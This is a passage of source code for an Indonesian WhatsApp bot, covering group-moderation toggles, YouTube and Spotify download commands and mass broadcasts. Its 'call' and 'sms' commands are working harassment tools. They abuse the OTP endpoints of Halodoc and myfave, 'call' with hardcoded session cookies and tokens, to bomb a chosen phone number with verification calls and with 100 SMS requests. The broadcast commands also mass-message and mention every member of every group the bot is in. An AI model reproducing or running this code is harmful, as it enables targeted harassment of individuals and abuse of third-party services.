for (let i of anu) {
await sleep(1500)
qyuunee.sendMessage(i, {text: `${text}`}, {quoted:koi})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break

case 'bcimg': case 'bcvid': case 'bcvideo': case 'share': {
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
if (m.isGroup) return reply(mess.private)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group`)
reply(mess.wait)
let getGroups = await qyuunee.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
global.teksjpm = text
for (let xnxx of anu) {
let metadat72 = await qyuunee.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await qyuunee.sendMessage(xnxx, { image: { url: mem }, caption: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: koi })
await sleep(2000)
} else {
if(/video/.test(mime)){
media1 = await qyuunee.downloadAndSaveMediaMessage(quoted)
mem1 = await uptotelegra(media1)
await qyuunee.sendMessage(xnxx, { video: { url: mem1 }, caption: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: koi })
await sleep(2000)
} else {
await qyuunee.sendMessage(xnxx, { text: global.teksjpm, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: koi })
await sleep(2000)
}}
}
}
break
/*
case 'welcome':
            case 'left': {
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].notification.status = true
                  reply(`${command} is enable`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].notification.status = false
                  reply(`${command} is disable`)
               }
            }
            break
            case 'settextwelcome':
            case 'setwelcome':{
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('teksnya?')
               db.data.chats[from].notification.status.text_welcome = args[0]
               reply(mess.success)
            }
            break 
            case 'settextleft':
            case 'setleft':{
               if (!isAdmins && !isCreator) return reply(mess.admin)
               if (args.length < 1) return reply('textnya?')
               db.data.chats[from].notification.status.text_left = args[0]
               reply(mess.success)
            }
            break 
*/
case 'nsfw': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].nsfw) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].nsfw = true
                    reply(`Nsfw Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].nsfw) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].nsfw = false
                    reply(`Nsfw Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antitoxic': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antitoxic) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antitoxic = true
                    reply(`Antitoxic Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antitoxic) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antitoxic = false
                    reply(`Antitoxic Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'autodown': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].autodown) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].autodown = true
                    reply(`Auto Download Aktif 🕊️\n\n- TikTok\n- YouTube\n- Instagram\n- Mediafire`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].autodown) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].autodown = false
                    reply(`Auto Download Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antibot': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antibot) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antibot = true
                    reply(`AntiBot Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antibot) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antibot = false
                    reply(`AntiBot Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antiviewonce': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antiviewonce) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antiviewonce = true
                    reply(`AntiViewOnce Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antiviewonce) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antiviewonce = false
                    reply(`AntiViewOnce Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antispam': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antispam) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antispam = true
                    reply(`Antispam Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antispam) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antispam = false
                    reply(`Antispam Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
            case 'antich': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antichannel) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antichannel = true
                    reply(`Okeii 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antichannel) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antichannel = false
                    reply(`Donee 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
case 'antilink': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antilink) return reply(`Sudah Aktif Sebelumnya 🕊️`)
                    db.data.chats[m.chat].antilink = true
                    reply(`Antilink Group WhatsApp Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antilink) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antilink = false
                    reply(`Antilink Group WhatsApp Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            case 'antilinkv2':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on'){
                    global.db.data.chats[m.chat].antilinkv2 = true
                    reply(`Berhasil Mengaktifkan antilinkv2`)
                } else if (q == 'off'){
                    global.db.data.chats[m.chat].antilinkv2 = false
                    reply(`Berhasil Mematikan antilinkv2`)
                }
            break
            case 'wdh':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
                if (q == 'on'){
                    global.db.data.chats[m.chat].wdh = true
                    reply(`Okeh`)
                } else if (q == 'off'){
                    global.db.data.chats[m.chat].wdh = false
                    reply(`Okeh`)
                }
            break
case 'mutegc': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].mute) return reply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = true
                    reply(`Bot telah di mute di group ini 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].mute) return reply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].mute = false
                    reply(`Bot telah di unmute di group ini 🕊️`)
                } else {
                   reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
            
case 'caisetting': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].cai) return reply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].cai = true
                    reply(`CAI telah aktif di group ini 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].cai) return reply(`Sudah Tidak Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].cai = false
                    reply(`CAI nonaktif di group ini 🕊️`)
                } else {
                   reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break
case 'antipanel':
case 'antipnl': {
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipanel) return reply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipanel = true
                    reply(`Anti Promosi Panel Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipanel) return reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipanel = false
                    reply(`Anti Promosi Panel Nonaktif 🕊️`)
                } else {
                    reply(`Mode ${command}\n\n\nKetik ${prefix + command} on/off`)
                }
            }
            break

case 'autoread':
            if (!isCreator) return reply(mess.owner)
            if (args.length < 1) return reply(`Contoh ${prefix + command} on/off`)
            if (q === 'on'){
            global.db.data.settings[botNumber].autoread = true
            reply(`Berhasil mengubah autoread ke ${q}`)
            } else if (q === 'off'){
            global.db.data.settings[botNumber].autoread = false
            reply(`Berhasil mengubah autoread ke ${q}`)
            }
        break

case '666': {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args.length < 1) return
if (args[0] === "on") {
if (autodelete) return
antidel.push(from)
reply('Succes menyalakan 666 di group ini ☠️')
} else if (args[0] === "off") {
if (!autodelete) return
let off = antidel.indexOf(from)
antidel.splice(off, 1)
reply('Succes mematikan 666 di group ini ☠️')
} else {
}
}
break

case "call":
if (!isCreator) return reply('*Khusus Owner*')
loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6289508082845`)
let nosend = "+" + text.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6289508082845`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

case 'sms': {
if (!isCreator) return reply('*Khusus Owner*')
loading()
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return reply('Awali nomor dengan +62')
if (froms == owner) return reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY Koi MODS`);
});
}
} else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6289508082845`)
reply(`spam sms/call akan di kirim ke no target`)
}
break

case 'yts': case 'ytsearch': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!text) reply `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
qyuunee.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break

case 'play': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!text) return reply(`Example: ${prefix + command} bad - wave to earth`)
loading()
let res = await yts(text)
let url = res.all;
let result = url[Math.floor(Math.random() * url.length)]
teks = `☉「 *ᴘ ʟ ᴀ ʏ - ʏ ᴛ* 」
│› sᴛᴀᴛᴜs : *true*
│› ᴊᴜᴅᴜʟ : *${result.title}*
│› ᴜᴘʟᴏᴀᴅ : *${result.ago}*
│› ᴜʀʟ : *${result.url}*
└──···☉`
let me = m.sender
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Kalo error bilang owner ya bang :3"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: { url: result.thumbnail }}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"Audio 🎵\",\"id\":\".ytmp3 " + result.url + "\"}"
              },
              {
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"Video 🎶\",\"id\":\".ytmp4 " + result.url + "\"}"
              },
              { "name": "quick_reply", "buttonParamsJson": `{"display_text":"Cari Lagi","id":".play ${text}"}` }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})

try {
    await qyuunee.sendMessage(m.chat, { delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}})
} catch (error) {
}
}
break

case 'play2': {
if (!isPremium) return reply(mess.prem)
if (!text) return reply(`Example: ${prefix + command} bad - wave to earth`)
loading()
let res = await yts(text)
let url = res.all;
let result = url[Math.floor(Math.random() * url.length)]
teks = `☉「 *ᴘ ʟ ᴀ ʏ - ʏ ᴛ* 」
│› sᴛᴀᴛᴜs : *true*
│› ᴊᴜᴅᴜʟ : *${result.title}*
│› ᴜᴘʟᴏᴀᴅ : *${result.ago}*
│› ᴜʀʟ : *${result.url}*
└──···☉`
let me = m.sender
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Kalo error bilang owner ya bang :3"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: { url: result.thumbnail }}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                'name': "quick_reply",
                'buttonParamsJson': "{\"display_text\":\"Send Audio\",\"id\":\".ytsend " + result.url + "\"}"
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break

case 'ytsend': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!text) return reply(`Example : ${prefix + command} link`)
await qyuunee.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let res = await yts(text)
let result = res.all;
try {
await ytdl.getInfo(text)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(text, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await qyuunee.sendMessage("120363201331652484@newsletter", { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4', ptt: true, fileLength: 88738, contextInfo:{"externalAdReply": {"title": `${result.title}`,"body": `${ucapanWaktu}`, "previewType": "PHOTO","thumbnail": thumb,"sourceUrl": `https://koi.pics`}}})
})
} catch (err) {
reply(`${err}`)
}
await qyuunee.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
}
break

case 'ytmp3': case 'youtubemp3': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!text) reply `Example : ${prefix + command} link`
loading()
downloadMp3(text)
}
break

/*case 'ytmp3': {
    if (!text) return m.reply("Linknya?");
    loading()
    try {
        const yt = new y2mate();
        const result = await yt.play(text); 
        const title = result.title;
        qyuunee.sendMessage(m.chat, { audio: { url: result.audio['mp3'].url }, mimetype: 'audio/mp4' }, { quoted: m })
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error); 
    }
}
break*/

case "spotifylirik":
    {
        const query = text.trim();
        
        if (!query) {
            return m.reply(`No Query?\n\nExample: ${prefix + command} https://open.spotify.com/track/6hBPSAsflvq3VVl3O34FfW`);
        }

        const spotify = new Spotify();

        try {
            const trackIdMatch = query.match(/track\/([a-zA-Z0-9]{22})/);
            const trackId = trackIdMatch ? trackIdMatch[1] : null;
            if (!trackId) {
                return m.reply("Invalid Spotify track URL.");
            }

            const details = await spotify.getDetails(query);
            const { title, artist, date } = details;

            const lyricsRes = await axios.get(`https://spotify-lyrics-api-pi.vercel.app/?trackid=${trackId}`);
            
            if (lyricsRes.status !== 200) {
                return m.reply("Failed to fetch lyrics from API.");
            }

            const lyricsData = lyricsRes.data;

            if (lyricsData.error || !lyricsData.lines || lyricsData.lines.length === 0) {
                return m.reply("Lirik tidak tersedia untuk track ini.");
            }

            const captionLyrics = `Title: ${title}\nArtist: ${artist}\nRelease Date: ${date}\n\nLyrics:\n`;
            const lyrics = lyricsData.lines.map(line => line.words).join('\n');

            const message = captionLyrics + lyrics;

            await qyuunee.sendMessage(from, { text: message,
            contextInfo: {
                mentionedJid: [
                    m.sender
                ],
                forwardingScore: 10,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: title,
                    body: artist,
                    thumbnailUrl: 'https://telegra.ph/file/bf1cd5bd92666aea80dd9.jpg',
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    mediaUrl: query,
                    sourceUrl: query,
                },
            },
        }, { quoted: m });
        
        } catch (e) {
            m.reply(`Error: ${e.message}`);
        }
    }
    break;
    
case 'spotify': {
    if (!text) {
        return m.reply(
            `Example: ${prefix + command} spotify_url`,
        );
    }

    loading()

    const spotify = new Spotify();

    try {
        const url = text;
        const isValidURL = url.includes("open.spotify.com");

        if (!isValidURL) {
            return m.reply("Invalid Spotify URL");
        }

        const details = await spotify.getDetails(url);
        const downloadLink = await spotify.download(url);

        const response = await axios.get(downloadLink, { responseType: 'arraybuffer' });
        const audioBuffer = Buffer.from(response.data);

        await qyuunee.sendMessage(from, { audio: audioBuffer,
            mimetype: 'audio/mp4',
            fileName: details.title,
            contextInfo: {
                mentionedJid: [
                    m.sender
                ],
                forwardingScore: 10,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: details.title,
                    body: `Artist: ${details.artists}`,
                    thumbnailUrl: details.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    mediaUrl: downloadLink,
                    sourceUrl: url,
                },
            },
        }, { quoted: m });

    } catch (error) {
        console.error("Error processing Spotify URL", error);
        m.reply("An error occurred while processing the Spotify URL.");
    }
}
break;

case 'splay': {
    if (!text) {
        return m.reply(
            `Example: ${prefix + command} query_spotify`,
        );
    }

    loading()
    
    try {
        const accessToken = await getAccessToken();
        if (!accessToken) {
            return m.reply('Failed to get access token.');
        }

        const searchResults = await searchSpotify(accessToken, text);
        if (!searchResults || searchResults.length === 0) {
            return m.reply('No results found.');
        }

        const formattedResults = formatSearchResults(searchResults);

        const randomIndex = Math.floor(Math.random() * formattedResults.length);
        const selectedResult = formattedResults[randomIndex];

teks = `☉「 *ᴘ ʟ ᴀ ʏ - 𝚜 𝚙 𝚘 𝚝 𝚒 𝚏 𝚢* 」
│› ᴛɪᴛʟᴇ : *${selectedResult.name}*
│› ᴀʀᴛɪsᴛ : *${selectedResult.artist}*
│› ᴜʀʟ : *${selectedResult.url}*
└──···☉`      
let me = m.sender
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ":3"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image: { url: selectedResult.thumb }}, { upload: qyuunee.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "quick_reply", "buttonParamsJson": `{"display_text":"Audio","id":".spotify ${selectedResult.url}"}` },
            { "name": "quick_reply", "buttonParamsJson": `{"display_text":"Cari Lagi","id":".splay ${text}"}` },
            { "name": "quick_reply", "buttonParamsJson": `{"display_text":"Lirik","id":".spotifylirik ${selectedResult.url}"}` }
           ],
          }),
          contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363201331652484@newsletter',
                  newsletterName: "🕊️ Follow Channel Aku (^^)/~~~",
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
    } catch (error) {
        console.error('Error during Spotify search:', error.message);
        m.reply('An error occurred while searching Spotify.');
    }
    
    try {
    await qyuunee.sendMessage(m.chat, { delete: {
remoteJid: m.chat,
fromMe: true,
id: m.quoted.id,
participant: m.quoted.sender
}})
} catch (error) {
}

}
break;

case 'git': case 'gitclone':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
                if (!args[0]) return reply(`Mana link nya?`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
                loading()
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
